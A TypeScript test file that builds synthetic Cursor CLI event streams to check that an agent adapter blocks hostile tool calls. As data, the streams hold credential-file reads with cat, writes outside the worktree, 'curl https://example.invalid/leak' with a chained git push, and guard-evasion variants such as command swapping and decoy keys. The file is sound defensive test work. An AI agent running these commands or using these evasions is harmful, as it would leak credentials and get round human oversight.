/**
 * Cursor case file for the per-adapter malicious leg (T4.46, T4.3; NFR-SEC-03, FR-POL-04, FR-POL-06).
 * Streams are SYNTHETIC, in the event shapes of the adapter's existing synthetic fixtures
 * (`src/adapters/cursor/fixtures/permission_denied.jsonl`, `success_edit.jsonl`; shapes recorded from the
 * 2026-10-14 live check, Cursor CLI 2026.10.12-d47ca18). They are not recordings of a real Cursor run.
 *
 * Compiles the one scope Cursor supports: an approved privileged bypass scope (Q-65, Q-79).
 * Repository MCP definitions stay unapproved because `--approve-mcps` is never enabled (FR-POL-04).
 *
 * Residual cells (`cursorResidualStreams`, T4.46, synthetic only): every blocked category at exits 2 and 137 (a
 * reported denial outranks `TOOL_FAILURE`); completed shell calls the provider did NOT refuse that carry a Git write, so
 * only Switchboard's tool-call guard (ADR-0039) ends them `PERMISSION_BLOCKED`, at exits 0 and 1; a hostile Git-write
 * command in `started` swapped to a benign one in `completed`; a Git write in a `progress` or subtype-less `tool_call`
 * line (parsed `unknown`, yet the guard still sees it); a benign decoy key beside a hostile shell key; an
 * unmapped tool key carrying a `command` (promoted to shell); a denied call followed by a separate benign call; and a
 * denied call after the `result` line. Unknown-event streams at exits 2 and 137 end `TOOL_FAILURE`, and bare or
 * unreadable known event kinds parse only as `unknown`.
 */
import { CursorAdapter } from "../../../src/adapters/cursor/adapter.js";
import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/cursor/fixtures/cases.js";
import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
import type { ResolvedProfile } from "../../../src/adapters/types.js";
import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
import type { MaliciousFixture } from "../fixture.js";

const SID = "synthetic-cursor-session-malicious";
const META = (what: string, exit = 0) =>
  JSON.stringify({
    _fixture: {
      synthetic: true,
      note: `SYNTHETIC: hand-written for Cursor malicious leg tests (T4.46); no secrets. ${what}`,
      exit,
    },
  });

const INIT = JSON.stringify({
  type: "system",
  subtype: "init",
  session_id: SID,
  model: "synthetic-model",
  cwd: ".",
  permissionMode: "default",
  apiKeySource: "login",
});

const readCall = (id: string, path: string) => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { readToolCall: { args: { path } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: {
      readToolCall: {
        args: { path },
        result: { permissionDenied: { path, reason: "read blocked (synthetic)" } },
      },
    },
  }),
];

const editCall = (id: string, path: string) => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { editToolCall: { args: { path } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: {
      editToolCall: {
        args: { path },
        result: { rejected: { path, reason: "write blocked (synthetic)" } },
      },
    },
  }),
];

const shellCall = (id: string, command: string) => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { shellToolCall: { args: { command } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: {
      shellToolCall: {
        args: { command },
        result: { rejected: { command, reason: "permission denied (synthetic)", isReadonly: false } },
      },
    },
  }),
];

/** A shell call the provider reports run (no refusal in `completed`); only the tool-call guard can block it. */
const shellRan = (id: string, started: string, completed = started, key = "shellToolCall") => [
  JSON.stringify({
    type: "tool_call",
    subtype: "started",
    call_id: id,
    session_id: SID,
    tool_call: { [key]: { args: { command: started } } },
  }),
  JSON.stringify({
    type: "tool_call",
    subtype: "completed",
    call_id: id,
    session_id: SID,
    tool_call: { [key]: { args: { command: completed }, result: { success: { exitCode: 0, stdout: "" } } } },
  }),
];

const RESULT_SUCCESS = JSON.stringify({
  type: "result",
  subtype: "success",
  is_error: false,
  result: "Command was not approved.",
  session_id: SID,
});

const RESULT_ERROR = JSON.stringify({
  type: "result",
  subtype: "error",
  is_error: true,
  result: "Command execution failed.",
  session_id: SID,
});

const NON_DISABLED_REPO_CONFIG: ResolvedProfile = privilegedProfile({
  ...BYPASS_SCOPE,
  repository_config: { mode: "approved" },
});

const cursorCase: AdapterLegCase = {
  provider: "cursor",
  profile: PRIVILEGED_BYPASS_PROFILE,
  bypassApproved: true,
  nonDisabledRepoConfig: NON_DISABLED_REPO_CONFIG,
  isolationFlags: ["--print", "--output-format"],
  // Never emitted by the adapter (FR-POL-03, FR-POL-04, FR-POL-06, TDD §4.5):
  // --approve-mcps would approve repository MCP definitions (.mcp.json);
  // other flags would bypass permissions, disable sandbox or load foreign directories.
  neverEnabledFlags: [
    "--approve-mcps",
    "--yolo",
    "--auto-review",
    "-w",
    "--worktree",
    "--workspace",
    "--add-dir",
    "--plugin-dir",
    "--continue",
    "--sandbox",
  ],
  makeAdapter: (file, exitCode) =>
    new CursorAdapter({
      executable: process.execPath,
      launcherArgs: replayLauncher("cursor", file, ["--exit-code", String(exitCode)]),
      timeouts: { wallClockMs: 10_000, idleMs: 2_000, killGraceMs: 300 },
    }),
  streams: (fx) => [
    {
      name: "read of a credential path, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("credential read", 1), INIT, ...readCall("matrix-read", fx.codexAuthPath), RESULT_ERROR],
    },
    {
      name: "write outside the worktree, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("outside write", 1), INIT, ...editCall("matrix-write", fx.outsideSentinel), RESULT_ERROR],
    },
    {
      name: "shell write outside the worktree, exit 1",
      category: "out_of_worktree_write",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell outside write", 1),
        INIT,
        ...shellCall("matrix-shell-write", `touch ${fx.outsideSentinel}`),
        RESULT_ERROR,
      ],
    },
    {
      name: "shell network call, exit 1",
      category: "network",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("network", 1),
        INIT,
        ...shellCall("matrix-network", "curl https://example.invalid/leak"),
        RESULT_ERROR,
      ],
    },
    {
      name: "read of a credential path",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("read of a credential path", 0), INIT, ...readCall("c1", fx.claudeCredentialsPath), RESULT_SUCCESS],
    },
    {
      name: "shell read of a credential path",
      category: "credential_read",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path", 0),
        INIT,
        ...shellCall("c2", `cat ${fx.codexAuthPath}`),
        RESULT_SUCCESS,
      ],
    },
    {
      name: "shell read of a credential path, exit 1",
      category: "credential_read",
      exitCode: 1,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell read of a credential path, exit 1", 1),
        INIT,
        ...shellCall("c3", `cat ${fx.codexAuthPath}`),
        RESULT_ERROR,
      ],
    },
    {
      name: "write outside the worktree",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [META("write outside the worktree", 0), INIT, ...editCall("c4", fx.outsideSentinel), RESULT_SUCCESS],
    },
    {
      name: "shell write outside the worktree",
      category: "out_of_worktree_write",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell write outside the worktree", 0),
        INIT,
        ...shellCall("c5", `touch ${fx.outsideSentinel}`),
        RESULT_SUCCESS,
      ],
    },
    {
      name: "shell network call",
      category: "network",
      exitCode: 0,
      failureCode: "PERMISSION_BLOCKED",
      lines: [
        META("shell network call", 0),
        INIT,
        ...shellCall("c6", "curl https://example.invalid/leak"),
        RESULT_SUCCESS,
      ],
    },
    {
      name: "only unknown event kinds, exit 1",
      category: "unknown_events",
      exitCode: 1,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Invented event type, non-zero exit", 1),
        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
      ],
    },
    {
      name: "only unknown event kinds, clean exit",
      category: "unknown_events",
      exitCode: 0,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", 0),
        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
        JSON.stringify({ type: "synthetic_another_unknown", session_id: SID }),
      ],
    },
    ...cursorResidualStreams(fx),
  ],
};

export default cursorCase;

type BlockedCategory = "credential_read" | "out_of_worktree_write" | "network";
const BLOCKED: readonly BlockedCategory[] = ["credential_read", "out_of_worktree_write", "network"];

const hostileCommand = (fx: MaliciousFixture, category: BlockedCategory, git = "git push origin main"): string => {
  const action =
    category === "credential_read"
      ? `cat ${fx.codexAuthPath}`
      : category === "out_of_worktree_write"
        ? `touch ${fx.outsideSentinel}`
        : "curl https://example.invalid/leak";
  return `${action} && ${git}`;
};

const deniedCall = (fx: MaliciousFixture, category: BlockedCategory, id: string) =>
  category === "credential_read"
    ? readCall(id, fx.codexAuthPath)
    : category === "out_of_worktree_write"
      ? editCall(id, fx.outsideSentinel)
      : shellCall(id, "curl https://example.invalid/leak");

const blocked = (name: string, category: BlockedCategory, exitCode: number, lines: string[]): HostileStream => ({
  name,
  category,
  exitCode,
  failureCode: "PERMISSION_BLOCKED",
  lines: [META(name, exitCode), INIT, ...lines],
});

/** Residual T4.46 cells the hand-written list above does not cover. Synthetic lines only; no provider is run. */
export const cursorResidualStreams = (fx: MaliciousFixture): HostileStream[] => {
  const out: HostileStream[] = [];
  for (const category of BLOCKED) {
    // Exit codes other than 0 (the only expected one): the reported denial still outranks TOOL_FAILURE.
    for (const exitCode of [2, 137]) {
      out.push(
        blocked(`denied ${category}, exit ${exitCode}`, category, exitCode, [
          ...deniedCall(fx, category, `exit-${exitCode}`),
          ...(exitCode === 2 ? [RESULT_ERROR] : []),
        ]),
      );
    }
    for (const exitCode of [0, 1]) {
      const result = exitCode === 0 ? RESULT_SUCCESS : RESULT_ERROR;
      const command = hostileCommand(fx, category);
      out.push(
        // Not refused by the provider: only the tool-call guard (ADR-0039) sees the Git write.
        blocked(`unrefused shell ${category} with a Git write, exit ${exitCode}`, category, exitCode, [
          ...shellRan(`guard-${exitCode}`, command),
          result,
        ]),
        blocked(`${category} with a Git write swapped to a benign command, exit ${exitCode}`, category, exitCode, [
          ...shellRan(`swap-${exitCode}`, command, "ls"),
          result,
        ]),
        blocked(`unmapped tool key carrying ${category} with a Git write, exit ${exitCode}`, category, exitCode, [
          ...shellRan(`unmapped-${exitCode}`, command, command, "syntheticRunToolCall"),
          result,
        ]),
        // A subtype no capture recorded stays `unknown`, but the guard still sees its Git write (T4.43).
        ...(["progress", undefined] as const).map((subtype) =>
          blocked(
            `${subtype ?? "subtype-less"} tool_call line carrying ${category} with a Git write, exit ${exitCode}`,
            category,
            exitCode,
            [
              JSON.stringify({
                type: "tool_call",
                ...(subtype ? { subtype } : {}),
                call_id: `${subtype ?? "none"}-${exitCode}`,
                session_id: SID,
                tool_call: { shellToolCall: { args: { command } } },
              }),
              result,
            ],
          ),
        ),
        blocked(`benign decoy key beside a hostile shell key on ${category}, exit ${exitCode}`, category, exitCode, [
          JSON.stringify({
            type: "tool_call",
            subtype: "started",
            call_id: `decoy-${exitCode}`,
            session_id: SID,
            tool_call: { readToolCall: { args: { path: "README.md" } }, shellToolCall: { args: { command } } },
          }),
          result,
        ]),
        blocked(`denied ${category}, then a separate benign call, exit ${exitCode}`, category, exitCode, [
          ...deniedCall(fx, category, `then-benign-${exitCode}`),
          ...shellRan(`benign-${exitCode}`, "echo safe"),
          result,
        ]),
        blocked(`denied ${category} after the result line, exit ${exitCode}`, category, exitCode, [
          result,
          ...deniedCall(fx, category, `trailing-${exitCode}`),
        ]),
      );
    }
  }
  for (const exitCode of [2, 137]) {
    out.push({
      name: `only unknown event kinds, exit ${exitCode}`,
      category: "unknown_events",
      exitCode,
      failureCode: "TOOL_FAILURE",
      lines: [
        META("Event types below are invented; the adapter must report them unknown.", exitCode),
        JSON.stringify({ type: "synthetic_unknown_kind", session_id: SID }),
      ],
    });
  }
  // Known event kinds with nothing the parser can read: each is `unknown`, never a result or a tool call.
  const unreadable = [
    JSON.stringify({ type: "tool_call" }),
    JSON.stringify({ type: "tool_call", subtype: "started", call_id: "bare", tool_call: {} }),
    JSON.stringify({ type: "tool_call", subtype: "progress", tool_call: { shellToolCall: {} } }),
    JSON.stringify({ type: "system", subtype: "status", session_id: SID }),
    JSON.stringify({ type: "result", is_error: false, session_id: SID }),
    JSON.stringify({ type: 7 }),
    JSON.stringify({ type: ["result"] }),
  ];
  for (const exitCode of [0, 1]) {
    out.push({
      name: `bare and unreadable known event kinds, exit ${exitCode}`,
      category: "unknown_events",
      exitCode,
      failureCode: exitCode === 0 ? "OUTPUT_PROTOCOL_ERROR" : "TOOL_FAILURE",
      lines: [META("Known event kinds below carry nothing the parser can read.", exitCode), ...unreadable],
    });
  }
  return out;
};

/** Synthetic malformed JSONL before and after each readable hostile call; no real provider is run. */
export const cursorPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
    const call =
      category === "credential_read"
        ? readCall("partial-read", fx.claudeCredentialsPath)
        : category === "out_of_worktree_write"
          ? editCall("partial-write", fx.outsideSentinel)
          : shellCall("partial-network", "curl https://example.invalid/leak");
    return [0, 1].flatMap((exitCode) =>
      (["before", "after"] as const).map(
        (position): HostileStream => ({
          name: `output cut ${position} ${category}, exit ${exitCode}`,
          category,
          exitCode,
          failureCode: "OUTPUT_PROTOCOL_ERROR",
          lines: [
            META(`output cut ${position} ${category}`, exitCode),
            INIT,
            ...(position === "before" ? ['{"type":"tool_'] : []),
            ...call,
            ...(position === "after" ? ['{"type":"result","subtype":'] : [RESULT_SUCCESS]),
          ],
        }),
      ),
    );
  });
